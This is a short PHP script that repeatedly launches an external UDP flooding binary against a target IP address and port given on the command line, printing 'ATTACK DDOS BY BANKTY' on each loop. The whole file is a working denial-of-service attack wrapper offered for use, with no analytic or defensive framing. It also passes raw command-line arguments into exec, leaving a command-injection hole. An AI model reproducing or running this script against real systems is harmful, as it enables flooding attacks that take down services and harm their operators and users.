<?php
for ($x = 0; $x <= $argv[3]; $x++) {
	$rand = rand(1,30);
	exec('/srv/udp2 '.$argv[1].' '.$argv[2].' '.$rand.' '.$rand.' 1');
	echo "ATTACK DDOS BY BANKTY ".$argv[1].":".$argv[2]." LOOP $x \n";
}
?>